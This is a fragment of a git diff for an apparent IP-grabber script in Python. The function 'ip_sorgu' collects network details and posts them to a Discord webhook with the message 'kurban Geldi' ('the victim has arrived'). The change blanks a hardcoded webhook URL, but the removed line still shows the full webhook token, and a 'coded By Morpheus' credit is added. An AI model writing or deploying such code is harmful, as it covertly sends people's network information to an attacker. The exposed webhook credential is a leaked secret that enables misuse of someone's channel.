@@ -16,7 +16,7 @@ def ip_sorgu():
     ass = veri["as"]
     
     # Discord Webhook URL'nizi buraya girin
-    webhook_url = "https://discord.com/api/webhooks/1086013408303923220/peco4TnKgpK44nZE4I5DV9eIUPm_r4sMwhWxxMVisg6f7qDvc8IxdSJfocbeBmvKOKeX"
+    webhook_url = ""
     
         
     hook = Webhook(webhook_url,avatar_url="https://i.hizliresim.com/gb6474y.png")
@@ -38,3 +38,4 @@ def ip_sorgu():
     hook.send("kurban Geldi")
 
 ip_sorgu()
+#coded By Morpheus
